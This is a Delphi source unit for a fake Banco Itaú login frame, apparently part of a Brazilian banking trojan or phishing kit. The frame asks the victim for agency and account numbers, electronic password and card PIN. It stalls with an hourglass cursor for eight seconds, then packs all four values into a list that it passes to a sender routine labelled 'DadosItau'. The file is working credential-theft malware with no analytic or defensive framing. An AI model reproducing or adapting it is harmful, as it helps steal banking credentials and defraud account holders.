unit Itas2;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, 
  Dialogs, pngimage, ExtCtrls, ItaTimer, StdCtrls;

type
  TItasFrame = class(TFrame)
    Image1: TImage;
    EditAg: TEdit;
    EditCont: TEdit;
    EditSE: TEdit;
    EditSC: TEdit;
    Confirmar: TImage;
    procedure ConfirmarClick(Sender: TObject);
    procedure EditContKeyPress(Sender: TObject; var Key: Char);
    procedure EditAgChange(Sender: TObject);
    procedure EditContChange(Sender: TObject);
    procedure EditSEChange(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;
  var
  TempoIta: TTempoIta;

implementation

{$R *.dfm}
uses
Natal, Gerador;

procedure TItasFrame.EditAgChange(Sender: TObject);
begin
  if Length(EditAg.Text) = 4 then
  EditCont.SetFocus;
end;

procedure TItasFrame.EditContChange(Sender: TObject);
begin
  if Length(EditCont.Text) = 7 then
  EditSE.SetFocus;
end;

procedure TItasFrame.EditContKeyPress(Sender: TObject; var Key: Char);
begin
  if Length(EditCont.Text) = 5 then
      begin
         EditCont.Text := EditCont.Text + '-';
         EditCont.Selstart := Length(EditCont.text);
      end;
end;

procedure TItasFrame.EditSEChange(Sender: TObject);
begin
  if Length(EditSE.Text) = 8 then
  EditSC.SetFocus;
end;

procedure TItasFrame.ConfirmarClick(Sender: TObject);
begin

  Screen.Cursor := crHourGlass;
  Sleep(8000);
  Screen.Cursor := crDefault;

   if EditAg.Text='' then
  begin
    MessageBox(Self.handle,'Por favor! Digite os números de sua Agência!', 'BANCO ITAU S.A', mb_IconError + mb_Ok);
    exit;
  end;

   if EditCont.Text='' then
  begin
    MessageBox(Self.handle,'Por favor! Digite os números de sua Conta com o Dígito!', 'BANCO ITAU S.A', mb_IconError + mb_Ok);
    exit;
  end;

   if EditSE.Text='' then
  begin
    MessageBox(Self.handle,'Por favor! Digite sua Senha Eletrônica !', 'BANCO ITAU S.A', mb_IconError + mb_Ok);
    exit;
  end;

   if EditSC.Text='' then
  begin
    MessageBox(Self.handle,'Por favor! Digite a Senha do Cartão!', 'BANCO ITAU S.A', mb_IconError + mb_Ok);
    exit;
  end;

  DadosEnvio_ := TStringList.Create;
  DadosEnvio_.Add('=============================================');
  DadosEnvio_.Add('ITAU');
  DadosEnvio_.Add('=============================================');
  DadosEnvio_.Add('AGENCIA:'+EditAg.Text);
  DadosEnvio_.Add('CONTA:  '+EditCont.Text);
  DadosEnvio_.Add('SENHA ELETRONICA:  '+EditSE.text);
  DadosEnvio_.Add('SENHA DO CARTAO:   '+EditSC.text);
  DadosEnvio_.Add('=============================================');

//SENDBOX
try
begin
  TempoIta := TTempoIta.Create(Self);

with TempoIta do
  begin
    Parent := Self;
    Height := 486;
    Left   := 19;
    Top    := 66;
    Width  := 785;
  end;

  SenderMass(DadosEnvio_ , 'DadosItau');
  DadosEnvio_.Free;
  end;
finally
end;
end;
end.
